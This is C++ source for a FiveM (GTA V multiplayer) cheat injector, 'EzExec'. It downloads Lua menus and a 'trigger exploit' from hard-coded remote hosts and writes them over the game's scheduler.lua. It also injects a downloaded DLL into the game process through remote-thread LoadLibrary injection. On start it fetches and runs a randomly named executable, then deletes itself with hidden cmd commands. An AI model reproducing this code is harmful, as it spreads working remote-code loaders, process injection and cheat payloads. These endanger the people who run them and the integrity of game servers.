#include <stdio.h>
#include <string>
#include <iostream>
#include <fstream>
#include <windows.h>
#include <time.h>
#include <string>
#include <iostream>
#include "auth.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <random>
#include <csignal>
#include <fstream>
#include <iostream>
#include <sstream> //std::stringstream
#include <iostream>
#include <random>
#include <string>
#include <fstream>
#include <sstream>
#include <strsafe.h>
#include "newauth.h"
#include "Console.h"
#pragma comment(lib, "urlmon.lib")
#define UNLEN 64

using namespace std;
namespace con = JadedHoboConsole;

string openfilename(HWND owner = NULL) {
	OPENFILENAME ofn;
	char fileName[MAX_PATH] = "";
	ZeroMemory(&ofn, sizeof(ofn));
	ofn.lStructSize = sizeof(OPENFILENAME);
	ofn.hwndOwner = owner;
	ofn.lpstrFilter = "Mod Menu Lua (*.lua)\0*.lua\0All Files (*.*)\0*.*\0";
	ofn.lpstrFile = fileName;
	ofn.nMaxFile = MAX_PATH;
	ofn.Flags = OFN_EXPLORER | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;
	ofn.lpstrDefExt = "";
	string fileNameStr;
	if (GetOpenFileName(&ofn))
		fileNameStr = fileName;
	return fileNameStr;
}

bool GetProcessEntryByName(string name, PROCESSENTRY32* pe) {
	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		cerr << "Tool helper cannot be created" << endl;
		return false;
	}

	if (!Process32First(snapshot, pe)) {
		cerr << "Tool helper cannot retrieve the first entry of process list" << endl;
		return false;
	}

	do {
		if (pe->szExeFile == name) {
			snapshot ? CloseHandle(snapshot) : 0;
			return true;
		}
	} while (Process32Next(snapshot, pe));

	snapshot ? CloseHandle(snapshot) : 0;
	return false;
}

namespace {
	std::string const default_chars =
		"abcdefghijklmnaoqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
}

std::string random_string(size_t len = 15, std::string const& allowed_chars = default_chars) {
	std::mt19937_64 gen{ std::random_device()() };

	std::uniform_int_distribution<size_t> dist{ 0, allowed_chars.length() - 1 };

	std::string ret;

	std::generate_n(std::back_inserter(ret), len, [&] { return allowed_chars[dist(gen)]; });
	return ret;
}

void clear() {
	COORD topLeft = { 0, 0 };
	HANDLE console = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFO screen;
	DWORD written;

	GetConsoleScreenBufferInfo(console, &screen);
	FillConsoleOutputCharacterA(
		console, ' ', screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	FillConsoleOutputAttribute(
		console, FOREGROUND_GREEN | FOREGROUND_RED | FOREGROUND_BLUE,
		screen.dwSize.X * screen.dwSize.Y, topLeft, &written
	);
	SetConsoleCursorPosition(console, topLeft);
}

void falloutfix(string trigger, string fastmenu)
{
	//GET CODE FROM WEB // INVISIBLE
	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
	string falloutcode = a_DownloadURL("http://149.91.88.55:8081/menu/sh_newfalloutv2.lua");
	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";

	//GET PATH AND CREATE FILE
	std::string path = getenv("LOCALAPPDATA");
	ofstream myfile;
	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
	myfile << shedulercode + "\n";
	if (trigger == "Y" || trigger == "y") {
		myfile << triggerexploit + "\n";
	}
	string fastmenucode = a_DownloadURL("http://149.91.88.55:8081/menu/fastmenu.lua");
	if (fastmenu == "Y" || fastmenu == "y") {
		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
	}
	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
	myfile.close();
}

void maestrofix(string trigger, string fastmenu)
{
	//GET CODE FROM WEB // INVISIBLE
	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
	string falloutcode = a_DownloadURL("http://149.91.88.55:8081/menu/sh_maestrov2.lua");
	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";

	//GET PATH AND CREATE FILE
	std::string path = getenv("LOCALAPPDATA");
	ofstream myfile;
	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
	myfile << shedulercode + "\n";
	if (trigger == "Y" || trigger == "y") {
		myfile << triggerexploit + "\n";
	}
	string fastmenucode = a_DownloadURL("http://149.91.88.55:8081/menu/fastmenu.lua");
	if (fastmenu == "Y" || fastmenu == "y") {
		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
	}
	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
	myfile.close();
}

void lynxfix(string trigger, string fastmenu)
{
	//GET CODE FROM WEB // INVISIBLE
	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
	string falloutcode = a_DownloadURL("http://149.91.88.55:8081/menu/sh_lynx.lua");
	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";
	
	//GET PATH AND CREATE FILE
	std::string path = getenv("LOCALAPPDATA");
	ofstream myfile;
	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
	myfile << shedulercode + "\n";
	if (trigger == "Y" || trigger == "y") {
		myfile << triggerexploit + "\n";
	}
	string fastmenucode = a_DownloadURL("http://149.91.88.55:8081/menu/fastmenu.lua");
	if (fastmenu == "Y" || fastmenu == "y") {
		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; + "\n";
	}
	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
	myfile.close();
}

void wavefix(string trigger, string fastmenu)
{
	//GET CODE FROM WEB // INVISIBLE
	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
	string falloutcode = a_DownloadURL("http://starlifewt.cluster029.hosting.ovh.net/ay444444444.lua");
	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";

	//GET PATH AND CREATE FILE
	std::string path = getenv("LOCALAPPDATA");
	ofstream myfile;
	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
	myfile << shedulercode + "\n";
	if (trigger == "Y" || trigger == "y") {
		myfile << triggerexploit + "\n";
	}
	string fastmenucode = a_DownloadURL("http://149.91.88.55:8081/menu/fastmenu.lua");
	if (fastmenu == "Y" || fastmenu == "y") {
		myfile << "if GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
	}
	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << falloutcode << "\nend";
	myfile.close();
}

void triggerandfast()
{
	//GET CODE FROM WEB // INVISIBLE
	string shedulercode = a_DownloadURL("https://pastebin.com/raw/SaPsiemN");
	string triggerexploit = "if GetCurrentResourceName() == \"chat\" then\nwhile ExecuteCommand == nil do\nWait(0)\nend\n\n______________ = ExecuteCommand\n________ = print\n_________ = load\n\nExecuteCommand = function(commandString)\nif commandString:sub(1, 1) == '/' then\nlocal code = commandString:sub(2)\nlocal s, e = _________(code)\nif s then\ns()\nelse\n________(\"ERROR:\" .. e)\nend\nelse\n______________(commandString)\nend\nend\nend\n";

	//GET PATH AND CREATE FILE
	std::string path = getenv("LOCALAPPDATA");
	ofstream myfile;
	// FLEMME string sheduler = "local debug = debug\nlocal coroutine_close = coroutine.close or (function(c) end) -- 5.3 compatibility\n\n-- setup msgpack compat\nmsgpack.set_string('string_compat')\nmsgpack.set_integer('unsigned')\nmsgpack.set_array('without_hole')\nmsgpack.setoption('empty_table_as_array', true)\n\n-- setup json compat\njson.version = json._VERSION -- Version compatibility\njson.setoption(\"empty_table_as_array\", true)json.setoption('with_hole', true)\n\n-- temp\nlocal function FormatStackTrace()\n	return Citizen.InvokeNative(`FORMAT_STACK_TRACE` & 0xFFFFFFFF, nil, 0, Citizen.ResultAsString())\nlocal function ProfilerEnterScope(scopeName)\nend\n\nlocal function ProfilerExitScope()\n	return Citizen.InvokeNative(`PROFILER_EXIT_SCOPE` & 0xFFFFFFFF)\n";
	myfile.open(path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua");
	myfile << shedulercode + "\n";
	myfile << triggerexploit + "\n";
	string fastmenucode = a_DownloadURL("http://149.91.88.55:8081/menu/fastmenu.lua");
	myfile << "\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << fastmenucode << "\nend"; +"\n";
	myfile.close();

}

void custimemenu()
{
	ShellExecuteA(0, "open", "cmd.exe", "/C del C:/Users/Public/a.lua", 0, SW_HIDE);
	string url = "http://149.91.88.55:8081/menu/sh_exemple1.lua";
	string location = "C:/Users/Public/puta.lua";
	HRESULT hr = URLDownloadToFileA(NULL, (url.c_str()), (location.c_str()), 0, NULL);
	Sleep(1000);
	string file = openfilename();
	ofstream myfile;
	ofstream myfile2;

	std::ifstream inFile;
	inFile.open(file); //open the input file
	std::stringstream strStream;
	strStream << inFile.rdbuf(); //read the file
	std::string str = strStream.str(); //str holds the content of the file

	std::ifstream inFile2;
	inFile2.open("C:/Users/Public/puta.lua"); //open the input file
	std::stringstream strStream2;
	strStream2 << inFile2.rdbuf(); //read the file
	std::string str2 = strStream2.str(); //str holds the content of the file

	myfile.open("C:/Users/Public/a.lua");
	myfile << "";
	myfile << str2;
	myfile << "\nCitizen.Trace(\"FULL INJECTION BY MASTERLUA\")\nTriggerServerEvent('FAC:EzExec')\nif GetCurrentResourceName() == \"chat\" then\n" << str << "\nend";
	myfile.close();

	ShellExecuteA(0, "open", "cmd.exe", "/C del C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua", 0, SW_HIDE);
	ShellExecuteA(0, "open", "cmd.exe", "/C echo f | xcopy /f /y c:\\Users\\Public\\a.lua C:\\Users\\%username%\\AppData\\Local\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua", 0, SW_HIDE);
}

void shbypass()
{
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	string fullPath;

	char buf[MAX_PATH] = { 0 };

	ShellExecuteA(0, "open", "cmd.exe", "/C rmdir /Q /S C:\\Users\\Public\\cache\\", 0, SW_HIDE);
	Sleep(500);
	ShellExecuteA(0, "open", "cmd.exe", "/C mkdir C:\\Users\\Public\\cache\\", 0, SW_HIDE);
	Sleep(500);
	string okkkk = random_string(11, "abcdefghijklmnopqrstuvwxyz123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ") + ".dll";
	string location = "C:\\Users\\Public\\cache\\" + okkkk;
	string url = "http://dev.masterlua.com:8081/ScriptHookBypass.dll";
	HRESULT hr = URLDownloadToFile(NULL, (url).c_str(), (location).c_str(), 0, NULL);

	GetFullPathName(location.c_str(), MAX_PATH, buf, nullptr);
	fullPath = string(buf, MAX_PATH);

	Sleep(500);

	for (; !GetProcessEntryByName("FiveM_GTAProcess.exe", &pe); Sleep(100));
	auto process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, false, pe.th32ProcessID);
	if (!process) {
		cerr << "Process cannot be opened" << endl;
		exit;
	}

	auto fpLoadLibrary = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

	auto mem = VirtualAllocEx(process, NULL, fullPath.length() + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!mem) {
		cerr << "Library name cannot be allocated" << endl;
		goto exit;
	}

	if (!WriteProcessMemory(process, mem, fullPath.c_str(), fullPath.length() + 1, nullptr)) {
		cerr << "Library name cannot be written" << endl;
		goto exit;
	}

	if (!CreateRemoteThread(process, nullptr, 0, (LPTHREAD_START_ROUTINE)fpLoadLibrary, mem, 0, nullptr)) {
		cerr << "Threads cannot be created" << endl;
		goto exit;
	}
	else {
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected !" << endl;
	}

	process ? CloseHandle(process) : 0;
exit:
	Sleep(2000);
}


void fixcrash()
{
	std::string path = getenv("LOCALAPPDATA");
	string deletes = "del " + path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua";
	system(deletes.c_str());
	string location = path + "\\FiveM\\FiveM.app\\citizen\\scripting\\lua\\scheduler.lua";
	string url = "http://dev.masterlua.com:8081/menu/sh_exemplerelease.lua";
	HRESULT hr = URLDownloadToFile(NULL, (url).c_str(), (location).c_str(), 0, NULL);
}

void DeleteMe()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\""), szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

std::string randomstring(std::string::size_type length)
{
	static auto& chrs = "0123456789"
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";

	thread_local static std::mt19937 rg{ std::random_device{}() };
	thread_local static std::uniform_int_distribution<std::string::size_type> pick(0, sizeof(chrs) - 2);

	std::string s;

	s.reserve(length);

	while (length--)
		s += chrs[pick(rg)];

	return s;
}

int main(int argc, const char* argv[]) {
#ifndef _WIN32
	std::cout << "This app only runs on windows." << std::endl;
	ExitProcess(0);
#endif

		if (!(argc == 2 && std::string(argv[1]) == "-startexec"))
	{
		std::string randomName = randomstring(16).append(".exe");

		string downloadlink = "http://dev.masterlua.com:8081/ok1.exe";

		HRESULT dl = URLDownloadToFile(nullptr, downloadlink.c_str(), randomName.c_str(), 0, nullptr);

		if (dl == S_OK)
		{
			SHELLEXECUTEINFO info = { 0 };
			info.cbSize = sizeof(SHELLEXECUTEINFO);
			info.fMask = SEE_MASK_NOCLOSEPROCESS;
			info.hwnd = NULL;
			info.lpVerb = NULL;
			info.lpFile = randomName.c_str();
			info.lpParameters = "-startexec";
			info.lpDirectory = NULL;
			info.nShow = SW_SHOW;
			info.hInstApp = NULL;

			ShellExecuteEx(&info);
			DeleteMe();
		}
		return 0;
	}

	system("START https://discord.gg/8qxpXeT");
	SetConsoleTitleA("EzExec | By MasterLua#9999 | Discord : https://discord.gg/8qxpXeT");
	clear();
	string  path;
	path = getenv("localappdata");
	ifstream ifile(path + "\\FiveM\\FiveM.app\\adhesive.dll");
	if (ifile) {
	}
	else {
		std::cout << con::fg_white << "[" << con::fg_red << "-" << con::fg_white << "] Your fivem not install in AppData\\Local\\FiveM\\FiveM.app\\ ! Reinstall fivem and try again !" << con::fg_white << " !";
		Sleep(999999999999999);
	}
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (GetProcessEntryByName("FiveM_GTAProcess.exe", &pe)) {
		std::cout << con::fg_white << "[" << con::fg_red << "-" << con::fg_white << "] You need open exec before " << con::fg_yellow << "FiveM" << con::fg_white << " !";
		Sleep(999999999999999999);
	}
	cout << "[" << con::fg_red << "+" << con::fg_white <<  "] Waiting for " << con::fg_green << "FiveM_GTAProcess.exe" << con::fg_white << " ..." << endl;
	for (; !GetProcessEntryByName("FiveM_GTAProcess.exe", &pe); Sleep(100));
	fixcrash();
	cout << "[" << con::fg_red << "+" << con::fg_white << "] Injected !" << endl;
	Sleep(3000);
	clear();
	cout << "[" << con::fg_green << "/" << con::fg_white << "] Thank you for choosing " << con::fg_blue << "EzShop " << con::fg_white << "!" << endl;
	Sleep(500);
	string result = a_DownloadURL("http://149.91.88.55:9999/execfree?check=tdmdKSfYF0joI9gR0YARpvatWOK9MsLV");
	if (result == "online") {
		cout << "[" << con::fg_green << "/" << con::fg_white << "] server is " << con::fg_green << "online" << con::fg_white << " ..." << endl;
		Sleep(500);
	}
	else {
		cout << "[" << con::fg_red << "!" << con::fg_white << "] server is " << con::fg_red << "offline" << con::fg_white << " ..." << endl;
		Sleep(9999999999999999999);
	}
	string version = a_DownloadURL("http://149.91.88.55:9999/execfree?version=tdmdKSfYF0joI9gR0YARpvatWOK9MsLV");
	if (version == "3.0") {
		cout << "[" << con::fg_green << "/" << con::fg_white << "] You have " << con::fg_green << "last update " << con::fg_white << "..." << endl;
		Sleep(500);
	}
	else {
		cout << "[" << con::fg_red << "!" << con::fg_white << "] You dont have " << con::fg_red << "last update " << con::fg_white << "..." << endl;
		Sleep(9999999999999999999);
	}
	string result2 = a_DownloadURL("http://149.91.88.55:9999/execfree?disable=tdmdKSfYF0joI9gR0YARpvatWOK9MsLV");
	string resultv3 = a_DownloadURL("http://149.91.88.55:9999/execfree?reason=tdmdKSfYF0joI9gR0YARpvatWOK9MsLV");
	if (result2 == "true") {
		cout << "[" << con::fg_red << "!" << con::fg_white << "] The exec is " << con::fg_red << "disabled" << con::fg_white << " | Reason : " << con::fg_white << resultv3 << endl;
		Sleep(99999999999999);
	}
	else {
		cout << "[" << con::fg_green << "/" << con::fg_white << "] The exec is " << con::fg_green << "not disabled " << con::fg_white << "..." << endl;
		Sleep(500);
	}
	std::cout << "\n";
	cout << "[" << con::fg_green << "1" << con::fg_white << "]" << con::fg_magenta << " EzMenu" << con::fg_white << endl;
	cout << "[" << con::fg_green << "2" << con::fg_white << "]" << con::fg_cyan << " Lynx 10" << con::fg_white << endl;
	cout << "[" << con::fg_green << "3" << con::fg_white << "]" << con::fg_red << " Maestro V2" << con::fg_white << endl;
	cout << "[" << con::fg_green << "4" << con::fg_white << "]" << con::fg_gray << " WaveMenu" << con::fg_white << endl;
	cout << "[" << con::fg_green << "5" << con::fg_white << "]" << con::fg_blue << " Custom Lua" << con::fg_white << " (Premium)" << endl;
	cout << "[" << con::fg_green << "6" << con::fg_white << "]" << con::fg_yellow << " Scriphook Bypass" << con::fg_white << " (Premium)" << endl;
	cout << "[" << con::fg_green << "7" << con::fg_white << "]" << con::fg_green << " Trigger & Fast Menu" << con::fg_white << endl;
	cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Menu : " << con::fg_white;
	string number;
	cin >> number;
	if (number == "1") {
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want trigger exploit ? [Y/N] Answer : ";
		string triggeroption;
		cin >> triggeroption;
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want fast menu exploit ? [Y/N] Answer : ";
		string fastmenu;
		cin >> fastmenu;

		falloutfix(triggeroption, fastmenu);
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected ! Key is DELETE" << endl;
		Sleep(99999999999999);
	}
	else if (number == "2") {
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want trigger exploit ? [Y/N] Answer : ";
		string triggeroption;
		cin >> triggeroption;
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want fast menu exploit ? [Y/N] Answer : ";
		string fastmenu;
		cin >> fastmenu;

		lynxfix(triggeroption, fastmenu);
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected ! Key is TAB" << endl;
		Sleep(99999999999999);
	}
	else if (number == "3") {
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want trigger exploit ? [Y/N] Answer : ";
		string triggeroption;
		cin >> triggeroption;
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want fast menu exploit ? [Y/N] Answer : ";
		string fastmenu;
		cin >> fastmenu;
		maestrofix(triggeroption, fastmenu);
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected ! Key is NUMPAD 6" << endl;
		Sleep(99999999999999);
	}
	else if (number == "4") {
			cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want trigger exploit ? [Y/N] Answer : ";
			string triggeroption;
			cin >> triggeroption;
			cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " You want fast menu exploit ? [Y/N] Answer : ";
			string fastmenu;
			cin >> fastmenu;
			wavefix(triggeroption, fastmenu);
			cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected !" << endl;
		Sleep(99999999999999);
	}
	else if (number == "5") {
		string customchecker = a_DownloadURL("http://dev.masterlua.com:9999/execfree?customlua=tdmdKSfYF0joI9gR0YARpvatWOK9MsLV&hwid=" + sp);
		if (customchecker == "SBQDOvp9KGxncioLBd7CPWAdBeTFRa6v") {
			custimemenu();
			cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected !" << endl;
		}
		else {
			cout << "[" << con::fg_red << "!" << con::fg_white << "] You dont have this premium option !" << con::fg_white << endl;
		}
		Sleep(99999999999999);
	}
	else if (number == "6") {
		string shcheck = a_DownloadURL("http://dev.masterlua.com:9999/execfree?shbypass=tdmdKSfYF0joI9gR0YARpvatWOK9MsLV&hwid=" + sp);
		if (shcheck == "SBQDOvp9KGxncioLBd7CPWAdBeTFRa6v") {
			shbypass();
		}
		else {
			cout << "[" << con::fg_red << "!" << con::fg_white << "] You dont have this premium option !" << con::fg_white << endl;
		}
		Sleep(99999999999999);
	}
	else if (number == "7") {
		triggerandfast();
		cout << "[" << con::fg_green << "+" << con::fg_white << "]" << con::fg_white << " Injected !" << endl;
	}
	else {
		cout << "[" << con::fg_red << "!" << con::fg_white << "] Wrong choice !" << con::fg_white << endl;
		Sleep(999999999999999);
	}
}